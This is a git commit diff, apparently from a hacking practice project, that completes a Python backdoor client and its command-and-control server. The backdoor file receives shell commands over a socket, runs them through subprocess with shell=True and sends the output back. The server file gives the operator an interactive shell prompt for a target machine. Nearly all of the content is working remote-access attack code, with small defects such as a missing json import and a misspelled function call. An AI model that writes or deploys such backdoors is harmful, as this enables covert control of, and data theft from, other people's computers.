6caed1d28974ba323168cfdebadc70baeb9d3732
edianantarafi <edianantarafi@gmail.com>
2023-07-17 12:06:15 +0700

    finish program

--- backdoor.py
+++ backdoor.py
@@ -1,4 +1,20 @@
 import socket
+import time
+import subprocess
+
+
+def reliable_send(data):
+    jsondata = json.dumps(data)
+    s.send(jsondata.encode())
+
+def reliable_recv():
+    data = ''
+    while True:
+        try: 
+            data = data + s.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError: 
+            continue
 
 def connection():
     while True:
@@ -10,6 +26,18 @@ def connection():
             break
         except:
             connection() 
+
+def shell():
+    while True:
+        command = reliable_recv()
+        if command == 'quit':
+            break
+        else: 
+            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            #parameter yang penting untuk variabel subprocess
+            result = execute.stdout.read() + execute.stderr.read()
+            result = result.decode()
+            reliable_send(result)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 conncetion()
--- server.py
+++ server.py
@@ -1,4 +1,36 @@
 import socket
+import json
+
+
+def reliable_send(data):
+    jsondata = json.dumps(data)
+    target.send(jsondata.encode())
+
+def reliable_recv():
+    data = ''
+    while True:
+        try: 
+            data = data + target.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError: 
+            continue
+
+def target_communication():
+    while True : 
+        command = input('* Shell`%s: ' % str(ip))
+        # %s bakal ngeprint ip address target
+        reliable_send(command)
+        if command == 'quit': 
+            break 
+        #you will stop the server program
+        # That means you want to stop communicationg with the target 
+        # & you want to close this server program 
+        else:   
+            result = reliable_recv()
+            print(result)
+        # Respons dari perintah kami terima menggunakan fungsi ini ke variabel hasil ini dan kemudian kami akan print hasilnya
+        # misal perintahnya ls atau dir, maka perintah itu mencantumkan semua file dan folder di dalam direktori, lalu hasil tersebut akan disimpan di dala variabel hasil ini kemudian akan di "print" file dan folder yang ada di dalam direktori target
+
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind(('10.30.90.14', 5555))
